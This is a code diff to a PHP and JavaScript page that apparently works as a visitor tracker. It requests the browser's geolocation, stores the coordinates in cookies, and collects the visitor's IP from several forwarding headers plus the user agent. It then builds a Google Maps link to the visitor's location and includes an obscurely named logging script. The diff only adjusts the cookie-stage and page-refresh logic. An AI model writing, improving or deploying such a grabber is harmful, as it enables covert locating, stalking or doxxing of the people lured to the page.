@@ -1,15 +1,13 @@
 <script>navigator.geolocation.getCurrentPosition(function (position){var lat=position.coords.latitude;var lon=position.coords.longitude;document.cookie="lat=" + lat;document.cookie="lon=" + lon;});document.cookie="a=1";</script>
 <?php
-$b = NULL;
-$b = $_COOKIE['b'];
-if ($b == "1"){
+$a = NULL;
+$a = $_COOKIE['a'];
+if ($a == "1"){setcookie("b","2", time()+2*24*60*60);header("Refresh:6");}
+if ($a == "2"){
 include '7c79Yc656i31Ifg.php';
-header("Refresh:5");
-echo serialize($msg);
-setcookie("b","2", time()+2*24*60*60);}
+echo serialize($msg);}
 $lat = NULL;
 $lon = NULL;
-$a = NULL;
 $client = NULL;
 $xforf = NULL;
 $xfor = NULL;
@@ -46,7 +44,6 @@ global $HTTP_SERVER_VARS;
 global $HTTP_USER_AGENT;
 $lat = $_COOKIE['lat'];
 $lon = $_COOKIE['lon'];
-$a = $_COOKIE['a'];
 $client = $_SERVER['HTTP_CLIENT_IP'];
 $xforf = $_SERVER['HTTP_X_FORWARDED_FOR'];
 $xfor = $_SERVER['HTTP_X_FORWARDED'];
@@ -57,7 +54,7 @@ $ipa = $_GET['addr'];
 $agent = $_SERVER['HTTP_USER_AGENT'];
 $hagent = $HTTP_SERVER_VARS['HTTP_USER_AGENT'];
 $gagent = $HTTP_USER_AGENT;
-if ($a == NULL){header("Refresh:5");setcookie("b","1", time()+2*24*60*60);}else{
+if ($a == NULL){header("Refresh:6");}else{
 $google = "//maps.google.com/maps?q=loc:".$lat."+".$lon;}
 if ($client != NULL){
 $clientv6 = preg_match("/^[0-9a-f]{1,4}:([0-9a-f]{0,4}:){1,6}[0-9a-f]{1,4}$/", $_SERVER['HTTP_CLIENT_IP']);
